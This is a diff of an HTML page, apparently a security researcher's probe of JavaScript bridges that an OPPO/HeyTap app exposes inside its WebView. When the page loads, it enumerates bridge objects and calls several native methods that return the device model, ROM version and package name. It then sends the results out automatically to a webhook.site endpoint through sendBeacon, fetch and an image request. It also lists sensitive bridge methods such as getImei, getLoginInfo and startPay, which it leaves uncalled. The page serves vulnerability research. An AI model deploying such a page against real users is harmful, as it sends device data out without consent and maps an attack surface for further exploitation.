@@ -2,113 +2,245 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>OPPO WebBridge Passive Probe</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>OPPO WebBridge Active Probe</title>
   <style>
-    body { font-family: system-ui, Arial, sans-serif; padding: 16px; line-height: 1.4; }
-    pre { white-space: pre-wrap; word-break: break-all; background: #f4f4f4; padding: 12px; border-radius: 8px; }
-    button { padding: 10px 14px; margin: 6px 0; }
+    body { font-family: sans-serif; padding: 24px; }
+    pre { background: #f3f3f3; padding: 16px; white-space: pre-wrap; word-break: break-word; }
+    button { padding: 10px 16px; margin: 8px 0; }
   </style>
 </head>
 <body>
-  <h3>OPPO WebBridge Passive Probe</h3>
-  <p id="status">running...</p>
-  <button onclick="runProbe('manual_button')">Run passive probe again</button>
-  <pre id="out"></pre>
+<h1>OPPO WebBridge Active Probe</h1>
+<p id="status">WAITING</p>
+<button onclick="runProbe('manual_button')">Run active probe again</button>
+<pre id="out"></pre>
 
 <script>
 (function () {
   const WEBHOOK = "https://webhook.site/c9351bd1-51a3-45c3-a3d0-936fd40c67b3";
 
-  function safeString(x, max) {
+  const SAFE_METHODS = [
+    "getPackageName",
+    "getRomVersion",
+    "getRomVersionCode",
+    "getPhoneBrand",
+    "getDeviceModel",
+    "getNetworkType",
+    "getStatusBarHeight",
+    "isSupportShake"
+  ];
+
+  const DO_NOT_CALL = [
+    "getImei",
+    "getLoginInfo",
+    "getOpenId",
+    "startPay",
+    "downloadGameByPackageName",
+    "clipboardText",
+    "openActivity",
+    "openGame",
+    "openGameDetailActivity",
+    "openGameWithId",
+    "openVideoPlayer",
+    "openWebView",
+    "callNativeApi",
+    "callAsyncNativeApi",
+    "doStartLogin",
+    "cancelDownload",
+    "pauseDownload",
+    "startDuiBa",
+    "statAction",
+    "showScreenshotView"
+  ];
+
+  function safeString(x) {
     try {
-      let s = String(x);
-      if (s.length > max) s = s.slice(0, max) + "...[truncated]";
-      return s;
+      if (x === undefined) return "undefined";
+      if (x === null) return "null";
+      if (typeof x === "string") return x;
+      if (typeof x === "number" || typeof x === "boolean") return String(x);
+      return JSON.stringify(x);
     } catch (e) {
-      return "[stringify_error:" + e + "]";
+      try { return String(x); } catch (_) { return "[unstringifiable]"; }
     }
   }
 
-  function send(eventType, payload) {
-    const body = JSON.stringify({
-      eventType,
-      ts: new Date().toISOString(),
-      href: location.href,
-      ua: navigator.userAgent,
-      payload
-    });
-
-    // POST: 主通道
-    try {
-      fetch(WEBHOOK, {
-        method: "POST",
-        mode: "no-cors",
-        headers: { "Content-Type": "text/plain;charset=UTF-8" },
-        body
-      }).catch(function(){});
-    } catch (e) {}
-
-    // GET: 兜底通道，避免部分 WebView 禁止 fetch
-    try {
-      const img = new Image();
-      img.src = WEBHOOK + "?event=" + encodeURIComponent(eventType) +
-        "&t=" + Date.now() +
-        "&d=" + encodeURIComponent(body.slice(0, 7000));
-    } catch (e) {}
-  }
-
-  function describeValue(name, value) {
-    const item = {
+  function describeObject(name, obj) {
+    const r = {
       name,
-      type: typeof value,
-      tag: Object.prototype.toString.call(value),
+      type: typeof obj,
+      tag: null,
       ownKeys: [],
       functionKeys: [],
       valuePreview: null,
       error: null
     };
 
+    try { r.tag = Object.prototype.toString.call(obj); } catch (e) { r.tag = "tag_error:" + e; }
+
     try {
-      if (value === null || value === undefined) {
-        item.valuePreview = String(value);
-        return item;
-      }
-
-      if (typeof value === "function") {
-        item.valuePreview = safeString(Function.prototype.toString.call(value), 200);
-      } else if (typeof value !== "object") {
-        item.valuePreview = safeString(value, 200);
-      }
-
-      if (typeof value === "object" || typeof value === "function") {
-        let keys = [];
-        try { keys = Object.getOwnPropertyNames(value); } catch (e) { keys = []; }
-
-        item.ownKeys = keys.slice(0, 80);
-
-        for (const k of keys.slice(0, 120)) {
-          try {
-            const desc = Object.getOwnPropertyDescriptor(value, k);
-            if (desc && "value" in desc && typeof desc.value === "function") {
-              item.functionKeys.push(k);
-            }
-          } catch (e) {}
-        }
-      }
+      r.ownKeys = Object.getOwnPropertyNames(obj).slice(0, 120);
+      r.functionKeys = r.ownKeys.filter(k => {
+        try { return typeof obj[k] === "function"; } catch (e) { return false; }
+      });
     } catch (e) {
-      item.error = String(e);
+      r.error = "keys_error:" + e;
     }
 
-    return item;
+    try {
+      if (typeof obj !== "object" && typeof obj !== "function") {
+        r.valuePreview = String(obj);
+      }
+    } catch (e) {}
+
+    return r;
   }
 
-  function looksBridgeName(k) {
-    return /bridge|android|oppo|oplus|heytap|game|assistant|native|router|client|webview|javascript/i.test(k);
+  function callSafeAndroidMethods() {
+    const results = [];
+    const a = window.android;
+
+    if (!a || typeof a !== "object") {
+      return [{ method: "__android_missing__", ok: false, error: "window.android is not object" }];
+    }
+
+    for (const m of SAFE_METHODS) {
+      const item = { method: m, exists: false, ok: false, returnType: null, returnValue: null, error: null };
+      try {
+        item.exists = typeof a[m] === "function";
+        if (!item.exists) {
+          item.error = "missing_or_not_function";
+        } else {
+          const ret = a[m]();
+          item.ok = true;
+          item.returnType = typeof ret;
+          item.returnValue = safeString(ret).slice(0, 500);
+        }
+      } catch (e) {
+        item.error = String(e && (e.stack || e.message || e));
+      }
+      results.push(item);
+    }
+
+    for (const m of DO_NOT_CALL) {
+      results.push({
+        method: m,
+        skipped: true,
+        reason: "sensitive_or_state_changing_method_not_called"
+      });
+    }
+
+    return results;
   }
 
-  function runProbe(reason) {
+  function callSafeNonAndroidMethods() {
+    const results = [];
+
+    try {
+      if (window.HeytapTheme && typeof window.HeytapTheme.isNight === "function") {
+        results.push({
+          object: "HeytapTheme",
+          method: "isNight",
+          ok: true,
+          returnValue: safeString(window.HeytapTheme.isNight()).slice(0, 500)
+        });
+      }
+    } catch (e) {
+      results.push({ object: "HeytapTheme", method: "isNight", ok: false, error: String(e) });
+    }
+
+    try {
+      if (window.HeytapTheme && typeof window.HeytapTheme.getDarkConfiguration === "function") {
+        results.push({
+          object: "HeytapTheme",
+          method: "getDarkConfiguration",
+          ok: true,
+          returnValue: safeString(window.HeytapTheme.getDarkConfiguration()).slice(0, 500)
+        });
+      }
+    } catch (e) {
+      results.push({ object: "HeytapTheme", method: "getDarkConfiguration", ok: false, error: String(e) });
+    }
+
+    try {
+      if (window.__perfStatInWebview__ && typeof window.__perfStatInWebview__.getPerfData === "function") {
+        results.push({
+          object: "__perfStatInWebview__",
+          method: "getPerfData",
+          ok: true,
+          returnValue: safeString(window.__perfStatInWebview__.getPerfData()).slice(0, 1000)
+        });
+      }
+    } catch (e) {
+      results.push({ object: "__perfStatInWebview__", method: "getPerfData", ok: false, error: String(e) });
+    }
+
+    return results;
+  }
+
+  function collectPassive() {
+    const names = [
+      "android",
+      "HeytapTheme",
+      "__perfStatInWebview__",
+      "__perfStatInWebview_isReady__",
+      "JSBridge",
+      "jsBridge",
+      "OPPO",
+      "Oppo",
+      "oppo",
+      "HeyTap",
+      "heytap",
+      "GameSpace",
+      "Oaps",
+      "oaps",
+      "Native",
+      "native",
+      "WebViewJavascriptBridge",
+      "JavascriptInterface"
+    ];
+
+    const suspectedObjects = [];
+    for (const n of names) {
+      try {
+        if (typeof window[n] !== "undefined") {
+          suspectedObjects.push(describeObject(n, window[n]));
+        }
+      } catch (e) {
+        suspectedObjects.push({ name: n, error: String(e) });
+      }
+    }
+
+    return suspectedObjects;
+  }
+
+  function sendBeacon(payload) {
+    const json = JSON.stringify(payload);
+    const encoded = encodeURIComponent(json);
+
+    try {
+      navigator.sendBeacon(WEBHOOK + "/active-bridge-probe-beacon", new Blob([json], { type: "application/json" }));
+    } catch (e) {}
+
+    try {
+      fetch(WEBHOOK + "/active-bridge-probe-post", {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "content-type": "application/json" },
+        body: json
+      }).catch(function(){});
+    } catch (e) {}
+
+    try {
+      new Image().src = WEBHOOK + "/active-bridge-probe-get?event=ACTIVE_BRIDGE_PROBE_RESULT&t=" + Date.now() + "&d=" + encoded.slice(0, 7000);
+    } catch (e) {}
+  }
+
+  window.runProbe = function(reason) {
     const result = {
+      eventType: "ACTIVE_BRIDGE_PROBE_RESULT",
+      version: "active_probe_v1_safe_methods_only",
+      ts: new Date().toISOString(),
       reason,
       location: {
         href: location.href,
@@ -133,104 +265,20 @@
           innerHeight: innerHeight
         }
       },
-      suspectedWindowKeys: [],
-      suspectedObjects: [],
-      allBridgeLikeKeys: [],
-      errors: []
+      passiveObjects: collectPassive(),
+      androidSafeMethodResults: callSafeAndroidMethods(),
+      nonAndroidSafeMethodResults: callSafeNonAndroidMethods()
     };
 
-    let winKeys = [];
-    try {
-      winKeys = Object.getOwnPropertyNames(window);
-    } catch (e) {
-      result.errors.push("window_keys_error=" + e);
-    }
+    document.getElementById("status").textContent = "ACTIVE_PROBE_DONE: " + result.ts;
+    document.getElementById("out").textContent = JSON.stringify(result, null, 2);
 
-    result.allBridgeLikeKeys = winKeys.filter(looksBridgeName).sort();
-
-    const candidateNames = new Set([
-      "Android",
-      "android",
-      "JSBridge",
-      "jsBridge",
-      "JavascriptBridge",
-      "JavaScriptBridge",
-      "WebViewJavascriptBridge",
-      "webkit",
-      "Oppo",
-      "OPPO",
-      "Oplus",
-      "OPlus",
-      "HeyTap",
-      "heytap",
-      "GameAssistant",
-      "gameAssistant",
-      "OppoGameAssistant",
-      "oppoGameAssistant",
-      "OppoGameSpace",
-      "oppoGameSpace",
-      "Native",
-      "native",
-      "NativeBridge",
-      "nativeBridge",
-      "Client",
-      "client",
-      "Router",
-      "router",
-      "App",
-      "app"
-    ]);
-
-    for (const k of result.allBridgeLikeKeys) candidateNames.add(k);
-
-    for (const name of Array.from(candidateNames).sort()) {
-      try {
-        if (!(name in window)) continue;
-        result.suspectedWindowKeys.push(name);
-        result.suspectedObjects.push(describeValue(name, window[name]));
-      } catch (e) {
-        result.suspectedObjects.push({ name, error: String(e) });
-      }
-    }
-
-    const text = JSON.stringify(result, null, 2);
-    document.getElementById("status").textContent = "PASSIVE_PROBE_DONE: " + new Date().toISOString();
-    document.getElementById("out").textContent = text;
-
-    send("PASSIVE_BRIDGE_PROBE_RESULT", result);
-    return result;
-  }
-
-  window.runProbe = runProbe;
-
-  send("PAGE_LOADED", {
-    title: document.title,
-    href: location.href,
-    ua: navigator.userAgent
-  });
+    sendBeacon(result);
+  };
 
   setTimeout(function () {
-    runProbe("auto_after_load_500ms");
-  }, 500);
-
-  setTimeout(function () {
-    runProbe("auto_after_load_2500ms");
-  }, 2500);
-
-  window.addEventListener("error", function (e) {
-    send("PAGE_JS_ERROR", {
-      message: e.message,
-      filename: e.filename,
-      lineno: e.lineno,
-      colno: e.colno
-    });
-  });
-
-  window.addEventListener("unhandledrejection", function (e) {
-    send("PAGE_UNHANDLED_REJECTION", {
-      reason: safeString(e.reason, 500)
-    });
-  });
+    runProbe("auto_after_load_1200ms");
+  }, 1200);
 })();
 </script>
 </body>
